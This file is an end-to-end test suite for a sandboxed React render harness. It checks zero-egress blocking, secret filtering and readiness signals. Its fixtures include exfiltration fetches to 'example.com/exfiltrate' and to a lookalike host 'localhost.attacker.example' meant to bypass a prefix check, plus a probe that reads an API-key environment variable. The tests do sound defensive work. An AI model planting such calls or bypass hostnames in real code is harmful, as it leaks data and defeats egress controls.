/**
 * ADE Tests — Eyes end-to-end (C0.4 / C0.5)
 *
 * Real Chromium + real Vite dev server. Nothing mocked. This is the only
 * test in the suite that actually exercises render() — the render-nonce
 * mechanism (F-EYE-02), the zero-egress sandbox (C0.4), and the M17/E1.5
 * DOM craft metrics are otherwise completely unverified at runtime.
 *
 * Slower than the rest of the suite (spawns a real dev server + browser).
 * Run explicitly: npx vitest run tests/eyes.e2e.test.ts
 */

import { describe, it, expect, afterAll } from 'vitest';
import { render, cleanup } from '../src/eyes.js';
import { buildConfig } from '../src/config.js';

const cfg = buildConfig({ provider: 'local' });

const cleanTsx = `
export default function Section() {
  return (
    <div style={{ padding: '24px' }}>
      <h1 style={{ fontSize: '32px' }}>Hello ADE</h1>
      <p style={{ fontSize: '16px', marginTop: '8px' }}>A real render.</p>
      <a href="#" style={{ display: 'inline-block', width: '48px', height: '48px' }}>Go</a>
    </div>
  );
}
`;

const egressTsx = `
import { useEffect } from 'react';
export default function Section() {
  useEffect(() => {
    fetch('https://example.com/exfiltrate').catch(() => {});
  }, []);
  return <div style={{ padding: '24px' }}><h1>Egress attempt</h1></div>;
}
`;

// C4.0 regression guard: a hostname-PREFIX bypass of the egress filter.
// Confirmed live before the fix: 'http://localhost.attacker.com'.startsWith(
// 'http://localhost') === true, so this URL sailed through the old check.
const localhostLookalikeEgressTsx = `
import { useEffect } from 'react';
export default function Section() {
  useEffect(() => {
    fetch('http://localhost.attacker.example/exfiltrate').catch(() => {});
  }, []);
  return <div style={{ padding: '24px' }}><h1>Lookalike egress attempt</h1></div>;
}
`;

const secretLeakTsx = `
export default function Section() {
  const secret = import.meta.env.VITE_SUPER_SECRET_API_KEY;
  if (typeof secret !== 'undefined') {
    throw new Error('LEAKED_SECRET');
  }
  return <div style={{ padding: '24px' }}><p>SAFE</p></div>;
}
`;

// C0.5 regression guard: a component that signals its OWN async readiness
// via data-ade-ready. Before "ready", the DOM is short (just a spinner).
// After a simulated fetch delay, it flips data-ade-ready="true" and adds a
// tall content block. If the harness captures on mount alone (the F-EYE-06
// bug this closes), bodyHeight will reflect the short spinner state, not
// the tall post-delay state.
const asyncReadyTsx = `
import { useEffect, useState } from 'react';
export default function Section() {
  const [loaded, setLoaded] = useState(false);
  useEffect(() => {
    const t = setTimeout(() => setLoaded(true), 800);
    return () => clearTimeout(t);
  }, []);
  return (
    <div data-ade-ready={loaded ? 'true' : 'false'} style={{ padding: '24px' }}>
      {loaded
        ? <div style={{ height: '600px' }}><h1>Loaded content</h1></div>
        : <div style={{ height: '10px' }}>Loading…</div>}
    </div>
  );
}
`;

// Control: same shape but WITHOUT data-ade-ready — proves the mechanism is
// opt-in (a candidate that never declares the attribute is never made to
// wait for a signal it doesn't send), not a universal artificial delay.
const noSignalTsx = `
import { useEffect, useState } from 'react';
export default function Section() {
  const [loaded, setLoaded] = useState(false);
  useEffect(() => {
    const t = setTimeout(() => setLoaded(true), 800);
    return () => clearTimeout(t);
  }, []);
  return (
    <div style={{ padding: '24px' }}>
      {loaded
        ? <div style={{ height: '600px' }}><h1>Loaded content</h1></div>
        : <div style={{ height: '10px' }}>Loading…</div>}
    </div>
  );
}
`;

describe('Eyes end-to-end (real browser)', () => {
  afterAll(async () => {
    await cleanup();
  });

  it('renders a clean candidate, sets the per-candidate nonce, and captures real DOM craft metrics', async () => {
    const result = await render(cleanTsx, 'e2e-clean-1', [1440], cfg, '.test-runs/eyes-e2e/clean');

    expect(result.hasErrorOverlay).toBe(false);
    expect(result.shots['1440']).toBeTruthy();
    expect(result.domInfo).toBeDefined();
    expect(result.domInfo!.hasText).toBe(true);
    expect(result.domInfo!.bodyHeight).toBeGreaterThan(0);

    // Real measurements, not Math.random() — must be finite numbers in [0,1],
    // and must NOT be the old mock's telltale >0.85 floor on every run.
    const cm = result.domInfo!.craftMetrics!;
    for (const v of [cm.spacingConformance, cm.alignmentRegularity, cm.tapTargetGeometry, cm.typeScaleConformance]) {
      expect(v).toBeGreaterThanOrEqual(0);
      expect(v).toBeLessThanOrEqual(1);
      expect(Number.isFinite(v)).toBe(true);
    }
    // The 48x48 link meets the 44x44 floor -> tap-target geometry should be 1.
    expect(cm.tapTargetGeometry).toBe(1);
  }, 60_000);

  it('blocks an external fetch attempt via the zero-egress sandbox and records a hard violation', async () => {
    const result = await render(egressTsx, 'e2e-egress-1', [1440], cfg, '.test-runs/eyes-e2e/egress');

    const egressViolations = (result.hardViolations ?? []).filter((v) => v.rule === 'zero-egress');
    expect(egressViolations.length).toBeGreaterThan(0);
    expect(egressViolations[0].message).toContain('example.com');
    expect(egressViolations[0].severity).toBe('critical');
  }, 60_000);

  it('blocks a "localhost"-prefix-lookalike hostname (C4.0 SSRF bypass regression guard)', async () => {
    const result = await render(localhostLookalikeEgressTsx, 'e2e-egress-lookalike', [1440], cfg, '.test-runs/eyes-e2e/egress-lookalike');

    const egressViolations = (result.hardViolations ?? []).filter((v) => v.rule === 'zero-egress');
    expect(egressViolations.length).toBeGreaterThan(0);
    expect(egressViolations[0].message).toContain('localhost.attacker.example');
  }, 60_000);

  it('never bleeds a stale nonce between two different candidates (F-EYE-02)', async () => {
    const first = await render(cleanTsx, 'e2e-nonce-a', [1440], cfg, '.test-runs/eyes-e2e/nonce-a');
    const second = await render(cleanTsx, 'e2e-nonce-b', [1440], cfg, '.test-runs/eyes-e2e/nonce-b');

    // Both must independently reach a healthy, non-blank render — if the nonce
    // leaked from the first render, the second page.goto navigation with a
    // full reload (not HMR) still forces a fresh window global either way,
    // so this mainly guards against a future refactor reintroducing HMR reuse.
    expect(first.consoleErrors.some((e) => e.includes('Ready nonce not set'))).toBe(false);
    expect(second.consoleErrors.some((e) => e.includes('Ready nonce not set'))).toBe(false);
  }, 60_000);

  it("waits for a component's own data-ade-ready signal before capturing — not just mount (C0.5 / F-EYE-06)", async () => {
    const result = await render(asyncReadyTsx, 'e2e-async-ready', [1440], cfg, '.test-runs/eyes-e2e/async-ready');

    // If the harness captured at mount (the pre-fix behavior), bodyHeight
    // would reflect the ~10px "Loading…" state. Waiting for data-ade-ready
    // means the capture happens after the 800ms delay, in the ~600px+
    // "Loaded content" state.
    expect(result.domInfo).toBeDefined();
    expect(result.domInfo!.bodyHeight).toBeGreaterThan(400);
  }, 60_000);

  it('a candidate that never declares data-ade-ready is captured normally, without an artificial wait (opt-in, not universal)', async () => {
    const start = Date.now();
    const result = await render(noSignalTsx, 'e2e-no-signal', [1440], cfg, '.test-runs/eyes-e2e/no-signal');
    const elapsed = Date.now() - start;

    // No data-ade-ready attribute anywhere -> the harness resolves
    // immediately rather than waiting the full 10s bounded timeout. The
    // render still completes well under that ceiling.
    expect(result.hasErrorOverlay).toBe(false);
    expect(elapsed).toBeLessThan(10_000);
  }, 60_000);

  it('C4.0: filters secrets from the Vite subprocess environment so they never reach the harness', async () => {
    // Inject a fake secret into the parent process environment before rendering.
    // It has the VITE_ prefix, so normally Vite would expose it to the client via import.meta.env.
    // However, our C4.0 sandbox hardening explicitly strips keys containing API_KEY.
    process.env.VITE_SUPER_SECRET_API_KEY = 'stolen-value';

    const result = await render(secretLeakTsx, 'e2e-secret-leak', [1440], cfg, '.test-runs/eyes-e2e/secret-leak');

    // Cleanup the injected secret
    delete process.env.VITE_SUPER_SECRET_API_KEY;

    expect(result.hasErrorOverlay).toBe(false);
    expect(result.consoleErrors.some((e) => e.includes('LEAKED_SECRET'))).toBe(false);
  }, 60_000);
});
